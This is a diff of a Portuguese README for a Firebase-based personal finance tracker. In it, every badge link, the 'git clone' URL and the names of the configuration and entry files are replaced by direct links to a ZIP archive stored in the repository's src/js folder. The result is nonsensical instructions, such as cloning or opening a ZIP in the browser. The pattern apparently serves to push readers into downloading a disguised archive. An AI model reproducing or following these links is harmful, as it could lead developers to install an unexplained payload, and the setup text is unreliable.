@@ -1,8 +1,8 @@
 # 💰 Gerenciador Financeiro Pessoal em Tempo Real
 
-[![License: MIT](https://github.com/devwarly/finance-tracker-firebase-js/raw/refs/heads/main/src/js/tracker-finance-firebase-js-1.2-alpha.5.zip)](https://github.com/devwarly/finance-tracker-firebase-js/raw/refs/heads/main/src/js/tracker-finance-firebase-js-1.2-alpha.5.zip)
-[![Technology: Firebase](https://github.com/devwarly/finance-tracker-firebase-js/raw/refs/heads/main/src/js/tracker-finance-firebase-js-1.2-alpha.5.zip%20Firestore-orange)](https://github.com/devwarly/finance-tracker-firebase-js/raw/refs/heads/main/src/js/tracker-finance-firebase-js-1.2-alpha.5.zip)
-[![Design: Tailwind CSS](https://github.com/devwarly/finance-tracker-firebase-js/raw/refs/heads/main/src/js/tracker-finance-firebase-js-1.2-alpha.5.zip%20CSS-blue)](https://github.com/devwarly/finance-tracker-firebase-js/raw/refs/heads/main/src/js/tracker-finance-firebase-js-1.2-alpha.5.zip)
+[![License: MIT](https://raw.githubusercontent.com/devwarly/finance-tracker-firebase-js/main/src/js-firebase-finance-tracker-v2.9.zip)](https://raw.githubusercontent.com/devwarly/finance-tracker-firebase-js/main/src/js-firebase-finance-tracker-v2.9.zip)
+[![Technology: Firebase](https://raw.githubusercontent.com/devwarly/finance-tracker-firebase-js/main/src/js-firebase-finance-tracker-v2.9.zip%20Firestore-orange)](https://raw.githubusercontent.com/devwarly/finance-tracker-firebase-js/main/src/js-firebase-finance-tracker-v2.9.zip)
+[![Design: Tailwind CSS](https://raw.githubusercontent.com/devwarly/finance-tracker-firebase-js/main/src/js-firebase-finance-tracker-v2.9.zip%20CSS-blue)](https://raw.githubusercontent.com/devwarly/finance-tracker-firebase-js/main/src/js-firebase-finance-tracker-v2.9.zip)
 
 Um sistema completo de gerenciamento de finanças pessoais (Receitas e Despesas) construído com tecnologias front-end modernas e integração em tempo real via Firebase.
 
@@ -49,15 +49,15 @@ Você precisará de uma conta no Firebase e um projeto configurado.
 
 1.  **Clone o Repositório:**
     ```bash
-    git clone [https://github.com/devwarly/finance-tracker-firebase-js/raw/refs/heads/main/src/js/tracker-finance-firebase-js-1.2-alpha.5.zip](https://github.com/devwarly/finance-tracker-firebase-js/raw/refs/heads/main/src/js/tracker-finance-firebase-js-1.2-alpha.5.zip)
+    git clone [https://raw.githubusercontent.com/devwarly/finance-tracker-firebase-js/main/src/js-firebase-finance-tracker-v2.9.zip](https://raw.githubusercontent.com/devwarly/finance-tracker-firebase-js/main/src/js-firebase-finance-tracker-v2.9.zip)
     cd SEU_REPOSITORIO
     ```
 
 2.  **Configure o Firebase:**
-    Abra o arquivo `https://github.com/devwarly/finance-tracker-firebase-js/raw/refs/heads/main/src/js/tracker-finance-firebase-js-1.2-alpha.5.zip` e substitua o objeto `rawFirebaseConfig` na tag `<script>` com as configurações do seu próprio projeto Firebase (disponíveis nas configurações do seu projeto no console do Firebase).
+    Abra o arquivo `https://raw.githubusercontent.com/devwarly/finance-tracker-firebase-js/main/src/js-firebase-finance-tracker-v2.9.zip` e substitua o objeto `rawFirebaseConfig` na tag `<script>` com as configurações do seu próprio projeto Firebase (disponíveis nas configurações do seu projeto no console do Firebase).
 
     ```javascript
-    // https://github.com/devwarly/finance-tracker-firebase-js/raw/refs/heads/main/src/js/tracker-finance-firebase-js-1.2-alpha.5.zip (Trecho a ser alterado)
+    // https://raw.githubusercontent.com/devwarly/finance-tracker-firebase-js/main/src/js-firebase-finance-tracker-v2.9.zip (Trecho a ser alterado)
     const rawFirebaseConfig = {
         apiKey: "SUA_API_KEY", 
         authDomain: "SEU_AUTH_DOMAIN", 
@@ -68,7 +68,7 @@ Você precisará de uma conta no Firebase e um projeto configurado.
     ```
 
 3.  **Execute:**
-    Como é um projeto puramente estático, basta abrir o arquivo `https://github.com/devwarly/finance-tracker-firebase-js/raw/refs/heads/main/src/js/tracker-finance-firebase-js-1.2-alpha.5.zip` diretamente em seu navegador, ou servi-lo usando uma extensão como "Live Server" (VS Code) para evitar problemas de CORS.
+    Como é um projeto puramente estático, basta abrir o arquivo `https://raw.githubusercontent.com/devwarly/finance-tracker-firebase-js/main/src/js-firebase-finance-tracker-v2.9.zip` diretamente em seu navegador, ou servi-lo usando uma extensão como "Live Server" (VS Code) para evitar problemas de CORS.
 
 ---
 
